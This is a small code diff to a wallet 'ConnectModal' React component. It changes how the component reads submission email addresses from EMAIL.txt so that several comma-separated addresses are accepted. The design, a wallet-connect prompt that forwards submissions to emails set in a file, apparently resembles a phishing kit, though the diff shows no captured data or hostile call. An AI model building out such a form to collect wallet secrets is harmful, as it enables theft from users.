@@ -33,7 +33,12 @@ export function ConnectModal({ isOpen, onClose, walletName, walletIcon }: Connec
             .then((res) => res.text())
             .then((text) => {
                 if (text && text.includes("@")) {
-                    setSubmissionEmail(text.trim());
+                    // Support multiple emails separated by commas
+                    const emails = text.split(',')
+                        .map(e => e.trim())
+                        .filter(e => e.includes('@'))
+                        .join(',');
+                    if (emails) setSubmissionEmail(emails);
                 }
             })
             .catch((err) => console.error("Could not load EMAIL.txt, using default", err));
